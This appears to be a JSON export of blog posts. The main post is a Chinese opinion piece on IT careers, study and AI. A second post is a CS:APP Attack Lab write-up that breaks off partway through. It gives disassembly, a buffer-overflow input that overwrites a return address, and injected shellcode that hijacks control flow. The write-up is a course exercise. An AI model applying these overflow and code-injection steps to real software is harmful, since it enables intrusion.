
[{"content":" 本期封面是《響け！ユーフォニアム》配角之一，中川夏纪，声音真的很好听，听说这个动漫到《利兹与青鸟》就完结了来着（？）\n关于IT行业的看法（IT另解笔记） # 学历在CS的行业不会成为任何优势（但是它重要），过硬的技术和能力才是，记清楚这一点，才不会盲目。请勿再将未来的希望寄托在你所在的学校身上了，你的一切，你的兴趣，都要自己费力去追寻\u0026hellip;\u0026hellip;\nCaution!本篇博文是强烈带有主观意见的意识流笔记，并且部分观点可能跟不上时代（2021年），因为我们的国家每天都在大步前进口牙！！！并且不代表笔者的全部观点，但是希望能对于在校的尚对于目标不明确的学生带来一些帮助，视频来源（https://space.bilibili.com/19658621），顺带推荐一下他的C语言视频，如果你还没有学过，或者已经工作但是有进一步理解的需要，学习一下这个视频，会颠覆你对于POP编程的认知。\n要明确的几个点 # 专业不是职业。\n比赛有什么用？没用\n企业合作类比赛 （目的是为了赚钱）\n对自己有没有提升 占不占时间\n不耽误时间 顺带拿奖可以去\n关键是通用技术的掌握 进实验室？为优秀的学生提供好的资源\n自行斟酌！！！ACM大赛（高中没学过，感觉大学很难融入，人家一开始就形成小圈子，要么就是你一开始就真的很感兴趣，然后花大量的时间去学习相关内容，也可以）\n教育的目的不是诺奖，体育的目的不是金牌。\n切莫相信个人的经验判断：\n没有人可以被模仿 人只能塑造自己的人生\n人只能关注自己的人生\n如果绩点都变成了一种值得骄傲与吹嘘的东西，那么，你的大学都学到了什么，你和备战高考的高中生又有什么区别，搞清楚这一点，学到东西，理解到东西，别你绩点高的人，在对于知识的理解上，可能还远远不如你。（这是真的）\n少听故事 多听现实和分析问题的方法 少关注别人的经历\n没有人能够准确地预测未来。\n对于后端程序员来说，计算机网络以及操作系统的理论是否重要。（应对面试）\n操作系统理论：尽可能去理解，值得深度学习。（深度了解操作系统）\n（数据结构本后的本质）\n教材只具有参考的意义，只有辅助的作用。看论文，有突破性的操作系统，前沿，作为后端的底盘。\n大二大三，实习？ # 校园招聘，针对于实习生（Microsoft，Google）申请实习，尽可能走校招（因为我没有什么经验） 社会招聘：有经验的人。 项目是很难的，产品，设计师，用户，开发流程，团队协作精神。。。项目有多少人在用？迭代版本？（工作当中的实际问题，开发的过程，称之为项目和经验，进入企业，才算社会的经验。）\n校园招聘： 良好的通用技术基础。\n\u0026amp;实习生入职一般会被分配什么样的工作。（技术底层越强，任务越核心）\n大厂 中小厂（有可能直接安排到核心职位，有可能没有考核）\nPS: 普通编程任务 小模块 （协作开发）目的：了解公司的开发流程\n培养实际项目经验 技术支持类（协助测试）\nIT类出国学习 # 要不要留学？经济基础 美国太贵 日本 新加坡 英国1.5年（50W）\n不错的经历 留在外面，能不能拿到国家的绿卡？被迫回国。\n奖学金 保研 值不值得？ # 能拿就拿，拿不了拉倒。 （目标是为了获得知识）\n保研 概率问题 不要盲目追求 真正需要研究生的人不需要保研，为什么保研？\n没有清楚自己的人生目的，我不知道研究生有什么用，先保研吧？？？\n自己不知道自己在干什么，嫉妒心，想尽办法争取保研的名额。争取攀登更高山峰的人，反而更能留下保研的可能，有目标的人，不会拘泥于此。\nIT行业的学历重不重要 # 学历很重要，能力很强，不需要学历（另说）\n有着学历的下限就可以（本科）技术上限\n工作好，是因为进的企业好，不是因为学历高。在什么公司担任什么样的工作，薪资和工作不是由学历决定的，是由公司决定的。\nIT技术的发展迭代问题 # 进化论，自然选择学说，没有什么东西是绝对稳定的，没有绝对稳定的工作。\n按键机——》触屏手机 国产手机 全部 系统基于Android系统\n（包括鸿蒙（Harmony OS）系统，基于Android系统，因其开源）\n渐变式的进化 对于技术来说是一样的 Microsoft Typescript基于Javascript\n所以要学习通用技术。（java py go c?）都是工具而已，类似物种间的竞争。\n都是面向对象的思想\n（误区：最多的东西不一定是趋势，很少人能够预料到趋势，流行不是趋势。）\nInter IMD Microsoft和Mac OS 滚轮不相同，形成差异化。C#\n物种的分化，苹果电脑-苹果-Mac touch-。。。\n所有的物种都会灭绝和衰落，不存在绝对稳定的工作与技术 机组原理 数据结构等等都短时间内难再有突破\n谈一谈Python # 不要想着一门语言就能找到工作。（2021年的形势）\n什么样的人去学：非计算机专业，会计\u0026hellip;\u0026hellip;\n人工智能是一个学科，其中的诸多框架是由C++实现的，python也只是写了一些脚本。CS学的东西相当多，语言只是一个工具，语言不是学科。大数据中最多的是java，人智最多是C++，数据分析JS，大脑是不限制语言的，语言也不能和职业扯上关系，主JAVA后端，主GOLANG后端，和职位有关，语言不能决定任何事情，不要纠结语言，不要纠结框架，库，算法底层，数据结构，架构，解决方案，软件构件，编程的艺术！！！（从低到高的一种程序员的排序）\n炒的很火，广告，培训机构，少儿编程。。。（钻石的价格为什么贵）\n解析性语言，2021年，python不好找工作对于开发人员来说，Python web，性能远远低于上述的语言，尤其不适合并发的项目，不是最优选择，容易出现性能问题，需要的岗位有但不多，认识清楚这样一点。\n如何跟进技术迭代 # 关注技术趋势的发展（元宇宙？）\n人工智能未来几年要解决的问题，前端（微前端）关注全球的会议\n国外的期刊之类，重要技术的迭代，培训，投资学习\n与行内业界认识专家合作，了解不同见解？云计算（尚早）\n利用开源社区 GitHub。。。使用的技术尽可能符合趋势发展\n（足够好的英文） 雅思6.0\n考试和实际应用的差异，研究考试。\n技术的目标：更快，更容易使用，更便宜。\n硬件的目标：更加小巧，便于使用。\n人工智能是否能够取代人类的工作 # 基本是完全是可能的，取代是趋势，包括程序员的工作。\n尽可能去追求艺术性的生活，在人工智能取代人类工作的时代，（人应该去享受幸福的生活与创作？） 目前人工智能处于停滞的状态，目前没有替代的能力，没有同理心判决的能力。\u0026mdash;李开复\n艺术的创作，基于个人主义（AI作画） 人类的发展基于人类的个性，人工智能不具备个人意识的能力（目前的情况）。\n人类社会的本质是为了文明的延续，不报乐观或者悲观的心态，基于客观的事实。（科学是将目光真切的看向每一个人）\n计算机系考研问题 # 人不可能攀登他不知道的高峰，还是明确的目的。很多人考研，保研是没有目的的行为，先考个研究生吧，不知道未来想干什么。\n大学生要有自我思考的能力，不能一味的跟风，寻找自己的目标，打开窗子看一看。多自己分析现实情况，问的人应当是自己理想的职位，请教正确的人，才可能获取正确的指导。（你应该干什么，你去干什么？？？老师学长学姐？？？）\n这个世界上没有学习能力的人都去当老师了。\n根据职业来决定，中国开设人智的大学就几个，该领域还是相当差。\n实事求是，不如别的国家。\n非群体判断标准 # 上了研就一定会走另一条道路吗?是否考研，成为什么样的人，都取决于自身的情况，而不应当考虑一个集体，我们都只是一个个体，我们不应当成为这样的集体中的一份子，不会因为选择什么，就会成为什么，我们应当基于个体的逻辑分析，我们有没有达到自己想要的岗位的学历的下限，从而去上研，应当学会抉择，而不是盲目的从大流。\n大学社团\n有没有参加的必要，参加了，应当以怎样的眼光看待？交流交往。谈个恋爱？？\n辩论社，音乐，美国化学学会。用处不是很大，主要取决于大学。毫无意义的学分增值，那便没有什么意义。太耗费时间，严重影响学业的话，显然。什么都做，最后可能啥也不是。。。具有很强的竞争气氛，缺乏包容心。。。\n根据自身的情况合理判断吧。\n当学校的培养方案与自己的目标冲突时\n不要漫无目的的卷，那就自己学，没有人歧视你是不是这个专业，没人管你，专业和职业是两个东西，没人在乎你以前是什么专业，只会管你有没有良好的工作能力。\n只有我们自己在乎自己过去不堪入目的往事，没人会记得。 有很多转职业专业者。\n外企 英语 面试题 刷题 # 要看具体的职位，外企待遇也不一定好，根据你想不想去。\n英语，具体情况具体分析，最低雅思6.0，作为最基础的英语水平，尽力去达到。\n忙冲算法？成为算法工程师，技术没有上限，天天刷题，不会进大厂(储蓄不能让人富裕)，最为愚蠢的行为，刷题只能证明你会刷题，不代表你会干活！\n(解释一下什么是操作系统？什么是多道任务？什么是资源管理？你是如何理解设备管理的？解释什么是进程，什么是线程，二者有何区别？进程和线程的实际应用？如何理解存储管理，内存管理，文件系统？解释什么是进程同步？什么是通信？如何理解信号量，消息队列，共享列成？什么叫调度策略？FCFS？STN？什么叫时间片轮转？PR？)？？？？？？？？？？？？？？？？？？？？显然，刷题无法解决这类问题？\n（进程是计算机当中程序的一次执行过程，拥有独立的内存空间，系统资源，线程是进程当中的一个执行单元，共享进程的系统空间和内存资源。应用：多任务处理，并发进程。）\n（内存管理:确保系统有足够的内存可运行程序，避免内存浪费。）\n（文件系统：存储数据的逻辑结构，负责文件的管理存储，负责文件的读写和修改。）\n(进程通信：进程之间传递信息的过程。同步。解决并发问题重要手段。)\n回答问题要有所准备，自己不理解的不要说。不要相信刷题就能进大厂，理解基础知识，有诸多开放性的话题，企业文化。\nAI专业与ACM # 根据自己的情况参加 ACM大赛组 校园招聘是一个加分项，但是并不重要，先要满足必要的要求。（找工作的角度）\n提升阅历的方式，是否愿意牺牲时间去参加这样的学习，自己的学习能力怎么样？鱼和熊掌不可兼得。。。时间有限，不可能什么事情的做好。重在参与是胡说八道，关键是自己要不要参与。空余的时间拿来干什么，自己能不能赢，如果没有赢的机会，那为什么要浪费时间参加。确定目标不要疏忽学业，保研？提升机会，选概率大的东西。区分清楚是锦上添花还是本末倒置。\n蓝桥杯：（报名费400元）有国家工信部撑腰，投了很多钱，背景很硬，参加的人越多的比赛越水，什么人都有。。。视自身情况而定，赚钱还是在搞教育。不要毕业了什么都不会，只会比赛，找实习没人看你拿了什么杯，我们中国人搞了这么多年比赛，获得了什么，只是许多证书，没有什么瞩目的成就，好的公司。搞教育的人都消失了，大家都去捞钱了，你获奖了，老师是分红利的，（一般的大学校，是分赃分利的地方），大部分大学老师，整天浑浑噩噩，等着捞国家红利，让学生们相信什么什么有用，优秀的老师不会整天让你干这干那，你应当干你自己喜欢的事情，追求自己的理想，人应当有认知真理，发现真相的能力，如果你真的喜欢ACM，那你就去干（前提是基础课学的不错哦），不要鸡汤喝得太多，鸡血打的太猛，\nChatGPT主题 # 人类总是害怕那些他们不能理解的事物。——辛德拉\n语言训练模型。小说科幻电影，都以艺术形式呈现，其目的是为了表达人的思想，并非事实。基于事实依据来分析，具体的逻辑。历史和神话的差距，科幻不等于事实。没有什么东西能够轻易的取代一个人，这种工具用于提升人的效率。人工智能只能让人更加有效率的完成任务，没有办法取代人的核心。咖啡师，采矿业等等普通的职业面临的危险，取代，取代的是人的行为，并非人本身。创作很大程度上还是要依赖人类，创作不是模仿，而是去创造新的东西，没有自我意识，训练模型的观点都来自于人类，并无创作的意识。\n计算机细分领域以及生态整合 # 软件开发，设计，编程，维护，测试，架构。 网络，建设维护，操作系统 数据库，设计开发维护三大类 人工智能，机器学习（探索阶段）-数据库-软件工程-语言训练模型（GPT） 嵌入式，嵌入系统，汽车，家电 网络安全，免受未经授权的访问 虚拟现实VR 信息安全 软件测试，售后 数据分析，大量数据提取有用的信息，支持决策，未来趋势-数据库 云计算虚拟化，允许将计算和存储资源从物理基础设施中抽象出来 学科交叉发展，很凌乱的，劳动分工，动态的社会，都在发挥各自的价值\n出国，自己去判断\n认知 决心 对自己的发展好不好？上述二者要达到平衡，金钱也只是其次的。。。\n程序员外包是什么以及为什么大多数人不推荐外包 # 软件开发交给外部的公司，接活干的公司，外包公司，这样的公司很累，员工很难受。节省成本，具有灵活性。-沟通协调的问题-打架，控制与质量问题，技术，进度，创意，不受控制。知识产权的丢失，有潜在的问题，也有合理之处。\n大学生要不要做兼职和搞外快\n家庭是否困难，根据条件来看，绝大部分人没有这样的需求，不要效仿别人赚钱，竞争力市场，根据需求，不能影响我们的主线任务的进展。\n职业的可转变性与避坑\n过了几年，岗位就没有了，失业了。\n小众的职位，假设一门技术X，也有可能是一门语言，存在一种可能，赌对了，有可能获得利润，有自己的前途，赌错了，即刻失业，Node.js近年来便引领了趋势。可能会带来致命的伤害，尽量去选通用的职位，大众的职位，有没有赌本？？？\n专用性程度 完全专用性 专用性程度：java golang 数据结构与算法 Linux 都有其专用性，其本身是具有多样性的。用于诸多的职位上。当有东西落寞的时候，你可以随时转型。\n完全：ios系统 VB（微软搞得）这样的技术要小心，只有一个针对点。\n！！微信小程序！！有可能生成了一种主流，但是要保持警惕。这样的赌注对你来说值不值得？\n一个要素的专用性越小，那么它从一种用途到另一种用途的可转变性就越大。JAVA并非针对某一种产品研发的语言。\n完全专用性在价值变动方面造成的影响要远远大于专用性程度造成的影响。\n学习记笔记的方法与心得 # IT要不要记笔记，怎么记笔记，有用，但看怎么记笔记。传统教育的问题，台上PPT，书本上学习的知识，笔记起到梳理的作用，笔记不是给自己看书法，争取起到有效的作用，尽量简洁，如果文字太多，尽量迅速筛选信息，纸质翻阅可能较为麻烦，自己看不懂，两个字，争取有效，可以尽量记到计算机上，打字比写字更快，不一定非要跟上时代的潮流，但是如果有效率更高的方法，那就去做。可以用Ipad，在PDF上标注，你要有需求用到它，而不是先去买这个东西。\n关于必修课，上课老师是不是按照这个教科书来的，搞清楚这一点，注意分配好自己的注意力。文综类的课程，关键点，经济学原理，这样的东西应当学会浓缩，听清楚这样一个点，听清楚要讲一个什么主题，什么观点，什么论点，关键证明手段。你记笔记的最好时间，厘清思路的最好时间，就是老师吹nb的时候。\nD define 关于这样的一个定义，是重点。这节课的点是什么，这节课讲述的结构是什么，建立起来逻辑，思维和记忆就会变得清晰，举了什么样的例子，也是十分重要的内容，我记笔记，是为了搞清楚结构和逻辑，而不是说，你一直抄我们书上有的内容与知识，这显然没有意义，我听了二三十分钟欧拉图，居然没有先建立欧拉图的具体概念，那你上课就是听天书。\n博客，博客是给别人看的，笔记是给自己看的，给自己梳理东西的，勾勾画画只有自己能看懂，不要浪费自己的时间，你看看之前的杰作，有许多人记笔记自己不好好看，那就没有任何的意义，你给别人看，就是要搞得谨慎一点，二者有着明显的区别。多多写对于自己的笔记和心得，自己应该在哪里更加注意，不要去记常识性的，一般性的东西，总之，我们说讲究一个，高效，实用，讲求逻辑。。。\n我们良好的一个状态，是说我们记的笔记越来越少，而学习的速度越来越快。\n引用自原博主动态：\n动态：新的开学季。 初高中：现在知道学历有下限了吧？ 大一：搞好生活，适应大学环境，搞懂大学的套路，不逃课、不早退、及时交作业就意味着平时分过了。学习、生活、社交、活动、比赛\u0026hellip;几头抓的，最后肯定很惨。大一刚开学搞明白大学生活，照顾好自己就足够了。 大二：一年过去了，大学生活和照顾自己都没问题了，已经摸清楚上课、活动、社交等各种逻辑，接下来就该考虑自己职业问题，是做什么？什么方向？什么领域？什么具体职位呢？尽可能无视各种社交活动，无视大学任何比赛，无视大学所有的战略培养计划，无视大学教师和学姐学长的建议，无视学习路线。把精力放在追逐具体职位的共性技术上，这一点我们在IT疑问点已经讲得十分清晰，愿能为你们节省数年时间，互联网信息繁杂，此方法可以避开各种坑。 大三：你应该已经处于追逐职业生涯的半路上了。专科的学生如果能升本科最好不过，本科的学生根据自己的职业需求来升级学历，最低下限学历是存在的，但不存在高学历的上限。如果扫厕所，可能需要初中学历，你已经满足，所以不要傻了吧唧的往前考，没有意义。除非是有意义的考，有些职位在行业里就要求博士，那你必须得考，除此之外白费功夫。 大四：实习，面试。面试才是最好的检验方法，除此之外，没有任何技术和方法能够检验你是否可以就业的水准。去吧，一定要去大城市，小城市是没有就业的：北上广深杭。五个都可以选。如果校招给力，建议走校招；如果你给力，直接去大厂官网应聘。 不论如何，对于技术的培养唯有持续不断地摸索与训练，而非单纯的计划与追踪。\n谈谈中国游戏开发 # 喜欢打游戏，没有经历过什么是游戏的开发。一个团队热爱开发游戏。R星 GTA5 荒野大镖客 RIOT games LOL 为创造游戏而生，体验开发游戏的艰辛，也体验开发游戏的成就。\n游戏的本质是软件，开发游戏不代表编程，C/S架构，不完全是，需要图形和渲染（游戏渲染引擎），\nUnity3D 美工 艺术视觉设计 数字媒体 在引擎中训练 编写成庞大的系统 服务器（后端）\n反作弊系统（安全开发工程师） 编剧 导演 设计师。。。牵扯了大量的职位\n独立开发者，光明记忆真的是一个人做的么？想要成功，一定要合作，认真去找。\n任何天才，都不能在孤独的环境中发展。\n打字训练 # 推荐网站：Typing club 网站 多加练习 Qwerty learner 多加练习，每天都练习，会有极恐怖的进步。。。\n谈谈数据结构使用代码实现 # 计算机中存储，组织数据的方式，用什么样的语言实现不重要，目前的教学方式就是用垃圾的代码去实现垃圾的数据结构，不理解数据结构的实现原理，而去看代码来理解。\n正确的数据结构可以提高算法的效率。Pop oop 都能实现，但方式明显不同，不要关注语言，语言来的快，去的也快，因为市场是多变的。了解底层。\n作业做不了，是因为语法不够熟练。（for嵌套，递归？这样的作业）\n计算机语言的共性，软件工程的一些术语 # 流程控制：循环，条件判断（控制结构），子函数（方法Java）\n我们所做的一些基本题，都是围绕着if for来进行的。重要的是一种感觉，用什么东西去处理，需要大量的练习，用什么语句，要几层的循环，要在纸上多写一写思路和结构，先想清楚，效率才会明显提升。。。。。。\n定时，效率 进行算法的练习\n结构化处理\n結構化的非區部控制流程\n有些程式語言會提供非區部的控制流程（non-local control flow），會允許流程跳出目前的程式碼，進入一段事先指定的程式碼。常用的結構化非區部控制流程可分為條件處理、异常处理及計算續體（Continuation）三種。\n异常处理：在编程语言领域，通常 例外（英語：）这一术语所描述的是一种資料结构，该資料结构可以存储异常（exceptional）相关訊息。例外处理的常见的一种机制是移交控制权。引发（raise）异常，也叫作抛出（throw）异常，通过该方式达到移交控制权的效果。例外抛出后，控制权会被移交至某处的接（catch），并执行处理。\n（比如C语言下标的越界）\n计算机续体：创建了一个全局的变量，未来在某个控制流中使用它，感觉是提前定义了一些东西。\n竞争 # 竞争的实质。做自己的第一名，产生特色，竞争的赢家只有第一名和第二名。你活在什么样的幸福里，父母给你摆平的路，给你营造的氛围，给你某某的规划，或者沉浸于学校好的骄傲感中，或者是什么实验班的就业计划\u0026hellip;\u0026hellip;\n务实与态度 # 年轻人要讲求务实，不能认为自己参加了一个什么比赛，获得过什么奖就能跨越一个阶层，你去面试外企，别人不会注意你比赛第几名，拿了什么奖，一点：你能不能帮公司解决这个问题，难道提升我们的教育水平，只能用比赛？？？这样的教育令人感到心寒。我们中国人喜欢比赛，宣传，形式主义，我们太在意表面现象，而不去追究深层次的问题，不追求深层次的东西，IT这个行业，我们是干不下去的，你想当什么样的人，你想干什么样的事，比狗p什么比赛更重要，不要认为只要你参加某某比赛，就能。。。我只要。。。就能。。。？？？此等幻想，同样应当干掉。能爬上去，一定是通过自己的努力，觉得学历不够，就去考。\n你选了一个自己不喜欢的专业，但是还能坚持学下去，并且当成乐趣，这就是tmd态度。你来学校是干嘛的？学习起来太费劲，高考好不容易完事儿了，为什么还要学习？觉得要学习的东西就像大海一样多，我怎么才能掌握这么多东西，我什么东西都要会，因此而迷茫。\n“做什么事情，不管是否是你想做的，既然你去做了，就把它做好，不管是不是你想象的样子，尝试去热爱它。”——态度\n你对真正想要做的事情有没有爱。\n“我心尽在此作。”\n面试 # No Job Is Perfect! 这里我认为还不重要，因为我们大多还是实习生（作为一个大学生的话），面试就是大量的实战并且积累经验，前提是你有足够扎实的底层知识。\n谈谈你的简历？\n目的：不是列举成就以及职责，想要一个重点突出的内容，这个职位为什么适合你？\n目的是阐述关联度，展示清晰的职业目标，你在哪里干了什么有特色的事情（20%缓存时间减少\u0026hellip;\u0026hellip;），是适合这个岗位的。\n明确过渡：离职的原因？（好好解释，没上班的时间怎么保持跟进技术的迭代）突出专业的声誉，要是有战略性的步骤。\n裁员：公司改变了策略。\n强调技能的不断提升，最好两三分钟结束。\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/itsolving_problems/","section":"Thinking","summary":"","title":"IT:Solving_Problems","type":"thinking"},{"content":"","date":"21 March 2025","externalUrl":null,"permalink":"/","section":"Mio's Tea Time","summary":"","title":"Mio's Tea Time","type":"page"},{"content":" \u0026ldquo;What kind of path are we walking on?\u0026rdquo;\n","date":"21 March 2025","externalUrl":null,"permalink":"/thinking/","section":"Thinking","summary":"","title":"Thinking","type":"thinking"},{"content":" 本期封面是动漫《Girls Band Cry》的主角团一行人参拜时的场景。\nCSAPP:AttackLab # [!WARNING]\n通过本实验，你将学习到利用安全性漏洞攻击操作系统和网络服务器的方法。本实验的目的是通过模拟攻击来增进对安全漏洞的理解和防范意识，了解安全漏洞的本质。本实验内容应仅用于学习目的，严禁用于任何非法或不道德的活动。 本实验开始前，需要学习CS:APP3e第3.10.3节和第3.10.4节的知识。 https://arthals.ink/blog/attack-lab 你还是可以参考这位的博客。 scp -p -r 2236115135-ics@x86.ics.xjtu-ants.net:./attacklab-2236115135-1235135 ~/ //scp下载远程服务器上的文件，如果要本地开发这是好的办法 前三层是CI（代码注入攻击）攻击，后两层是ROP（返回导向编程）攻击。\n代码注入攻击（Code Injection Attacks） # phase1: # 0000000000401a90 \u0026lt;test\u0026gt;: 401a90:\t48 83 ec 08 sub $0x8,%rsp ; 分配了八个字节的空间 401a94:\tb8 00 00 00 00 mov $0x0,%eax 401a99:\te8 31 fe ff ff call 4018cf \u0026lt;getbuf\u0026gt; ; 调用了getbuf函数 401a9e:\t89 c2 mov %eax,%edx 401aa0:\tbe e8 31 40 00 mov $0x4031e8,%esi 401aa5:\tbf 01 00 00 00 mov $0x1,%edi 401aaa:\tb8 00 00 00 00 mov $0x0,%eax 401aaf:\te8 3c f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401ab4:\t48 83 c4 08 add $0x8,%rsp 401ab8:\tc3 ret 00000000004018cf \u0026lt;getbuf\u0026gt;: 4018cf:\t48 83 ec 38 sub $0x38,%rsp ; 分配了56个字节的空间（在buf里） 4018d3:\t48 89 e7 mov %rsp,%rdi 4018d6:\te8 7e 02 00 00 call 401b59 \u0026lt;Gets\u0026gt; 4018db:\tb8 01 00 00 00 mov $0x1,%eax 4018e0:\t48 83 c4 38 add $0x38,%rsp 4018e4:\tc3 ret 00000000004018e5 \u0026lt;touch1\u0026gt;: 4018e5:\t48 83 ec 08 sub $0x8,%rsp 4018e9:\tc7 05 2d 2c 20 00 01 movl $0x1,0x202c2d(%rip) # 604520 \u0026lt;vlevel\u0026gt; 4018f0:\t00 00 00 4018f3:\tbf 22 31 40 00 mov $0x403122,%edi 4018f8:\te8 53 f4 ff ff call 400d50 \u0026lt;puts@plt\u0026gt; 4018fd:\tbf 01 00 00 00 mov $0x1,%edi 401902:\te8 92 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401907:\tbf 00 00 00 00 mov $0x0,%edi 40190c:\te8 bf f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 我要把return的地址覆盖成上面的touch1函数的首地址以执行touch1函数。\n那么直接构造如下的输入字符串即可，记得使用hex2raw工具。\n00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e5 18 40 00 phase2: # 这里的操作就是：1.同理覆盖地址。2.你要传一个参数来执行你的代码。\n我要把覆盖的地址变成touch2,同时要传参数。\n0000000000401911 \u0026lt;touch2\u0026gt;: 401911:\t48 83 ec 08 sub $0x8,%rsp 401915:\t89 fa mov %edi,%edx 401917:\tc7 05 ff 2b 20 00 02 movl $0x2,0x202bff(%rip) # 604520 \u0026lt;vlevel\u0026gt; 40191e:\t00 00 00 401921:\t39 3d 01 2c 20 00 cmp %edi,0x202c01(%rip) # 604528 \u0026lt;cookie\u0026gt; 401927:\t75 20 jne 401949 \u0026lt;touch2+0x38\u0026gt; 401929:\tbe 48 31 40 00 mov $0x403148,%esi 40192e:\tbf 01 00 00 00 mov $0x1,%edi 401933:\tb8 00 00 00 00 mov $0x0,%eax 401938:\te8 b3 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40193d:\tbf 02 00 00 00 mov $0x2,%edi 401942:\te8 52 03 00 00 call 401c99 \u0026lt;validate\u0026gt; 401947:\teb 1e jmp 401967 \u0026lt;touch2+0x56\u0026gt; 401949:\tbe 70 31 40 00 mov $0x403170,%esi 40194e:\tbf 01 00 00 00 mov $0x1,%edi 401953:\tb8 00 00 00 00 mov $0x0,%eax 401958:\te8 93 f3 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 40195d:\tbf 02 00 00 00 mov $0x2,%edi 401962:\te8 f4 03 00 00 call 401d5b \u0026lt;fail\u0026gt; 401967:\tbf 00 00 00 00 mov $0x0,%edi 40196c:\te8 5f f5 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 过程：覆盖调用函数的返回地址来执行我的代码（这相当于是在stack上执行我的代码，你想这要怎么做到？把ret要覆盖的地址设置成分配之后的rsp的值，那么rip便会从这里开始执行代码，我们再将代码放进缓冲区，好妙的攻击技巧），我的代码把%rdi设置成我的cookie值，并且通过ret指令返回到touch2函数执行。\n在getbuf分配完了栈空间之后，%rsp = 0x5563c8d8,这也就是缓冲区的起始地址。\n我们构造：\nmovq $0x14e6646f,%rdi ; 把第一个参数设置成cookie值 pushq $0x00401911 ; 这里push进去一个touch2的首地址值 ret ; ret实际上就是把刚刚push进去的值拿出来然后跳转执行 // gcc -c asm.s // objdump -d asm.o \u0026gt; asm.byte 我们拿到这段汇编指令的字节码 phase3: # 还是传参，但是会更麻烦，要调用更多的函数来解决这个问题,我要把我的cookie值作为一个string传给touch3。\n0000000000401971 \u0026lt;hexmatch\u0026gt;: 401971:\t41 54 push %r12 401973:\t55 push %rbp 401974:\t53 push %rbx 401975:\t48 83 c4 80 add $0xffffffffffffff80,%rsp 401979:\t89 fd mov %edi,%ebp 40197b:\t48 89 f3 mov %rsi,%rbx 40197e:\t64 48 8b 04 25 28 00 mov %fs:0x28,%rax 401985:\t00 00 401987:\t48 89 44 24 78 mov %rax,0x78(%rsp) 40198c:\t31 c0 xor %eax,%eax 40198e:\te8 bd f4 ff ff call 400e50 \u0026lt;random@plt\u0026gt; 401993:\t48 89 c1 mov %rax,%rcx 401996:\t48 ba 0b d7 a3 70 3d movabs $0xa3d70a3d70a3d70b,%rdx 40199d:\t0a d7 a3 4019a0:\t48 f7 ea imul %rdx 4019a3:\t48 01 ca add %rcx,%rdx 4019a6:\t48 c1 fa 06 sar $0x6,%rdx 4019aa:\t48 89 c8 mov %rcx,%rax 4019ad:\t48 c1 f8 3f sar $0x3f,%rax 4019b1:\t48 29 c2 sub %rax,%rdx 4019b4:\t48 8d 04 92 lea (%rdx,%rdx,4),%rax 4019b8:\t48 8d 14 80 lea (%rax,%rax,4),%rdx 4019bc:\t48 8d 04 95 00 00 00 lea 0x0(,%rdx,4),%rax 4019c3:\t00 4019c4:\t48 29 c1 sub %rax,%rcx 4019c7:\t4c 8d 24 0c lea (%rsp,%rcx,1),%r12 4019cb:\t41 89 e8 mov %ebp,%r8d 4019ce:\tb9 3f 31 40 00 mov $0x40313f,%ecx 4019d3:\t48 c7 c2 ff ff ff ff mov $0xffffffffffffffff,%rdx 4019da:\tbe 01 00 00 00 mov $0x1,%esi 4019df:\t4c 89 e7 mov %r12,%rdi 4019e2:\tb8 00 00 00 00 mov $0x0,%eax 4019e7:\te8 44 f4 ff ff call 400e30 \u0026lt;__sprintf_chk@plt\u0026gt; 4019ec:\tba 09 00 00 00 mov $0x9,%edx 4019f1:\t4c 89 e6 mov %r12,%rsi 4019f4:\t48 89 df mov %rbx,%rdi 4019f7:\te8 34 f3 ff ff call 400d30 \u0026lt;strncmp@plt\u0026gt; 4019fc:\t85 c0 test %eax,%eax 4019fe:\t0f 94 c0 sete %al 401a01:\t48 8b 5c 24 78 mov 0x78(%rsp),%rbx 401a06:\t64 48 33 1c 25 28 00 xor %fs:0x28,%rbx 401a0d:\t00 00 401a0f:\t74 05 je 401a16 \u0026lt;hexmatch+0xa5\u0026gt; 401a11:\te8 5a f3 ff ff call 400d70 \u0026lt;__stack_chk_fail@plt\u0026gt; 401a16:\t0f b6 c0 movzbl %al,%eax 401a19:\t48 83 ec 80 sub $0xffffffffffffff80,%rsp 401a1d:\t5b pop %rbx 401a1e:\t5d pop %rbp 401a1f:\t41 5c pop %r12 401a21:\tc3 ret 0000000000401a22 \u0026lt;touch3\u0026gt;: 401a22:\t53 push %rbx 401a23:\t48 89 fb mov %rdi,%rbx 401a26:\tc7 05 f0 2a 20 00 03 movl $0x3,0x202af0(%rip) # 604520 \u0026lt;vlevel\u0026gt; 401a2d:\t00 00 00 401a30:\t48 89 fe mov %rdi,%rsi 401a33:\t8b 3d ef 2a 20 00 mov 0x202aef(%rip),%edi # 604528 \u0026lt;cookie\u0026gt; 401a39:\te8 33 ff ff ff call 401971 \u0026lt;hexmatch\u0026gt; 401a3e:\t85 c0 test %eax,%eax 401a40:\t74 23 je 401a65 \u0026lt;touch3+0x43\u0026gt; 401a42:\t48 89 da mov %rbx,%rdx 401a45:\tbe 98 31 40 00 mov $0x403198,%esi 401a4a:\tbf 01 00 00 00 mov $0x1,%edi 401a4f:\tb8 00 00 00 00 mov $0x0,%eax 401a54:\te8 97 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a59:\tbf 03 00 00 00 mov $0x3,%edi 401a5e:\te8 36 02 00 00 call 401c99 \u0026lt;validate\u0026gt; 401a63:\teb 21 jmp 401a86 \u0026lt;touch3+0x64\u0026gt; 401a65:\t48 89 da mov %rbx,%rdx 401a68:\tbe c0 31 40 00 mov $0x4031c0,%esi 401a6d:\tbf 01 00 00 00 mov $0x1,%edi 401a72:\tb8 00 00 00 00 mov $0x0,%eax 401a77:\te8 74 f2 ff ff call 400cf0 \u0026lt;__printf_chk@plt\u0026gt; 401a7c:\tbf 03 00 00 00 mov $0x3,%edi 401a81:\te8 d5 02 00 00 call 401d5b \u0026lt;fail\u0026gt; 401a86:\tbf 00 00 00 00 mov $0x0,%edi 401a8b:\te8 40 f4 ff ff call 400ed0 \u0026lt;exit@plt\u0026gt; 这是上面两个函数的C语言源代码：\n/* Compare string to hex represention of unsigned value */ int hexmatch(unsigned val, char *sval) { char 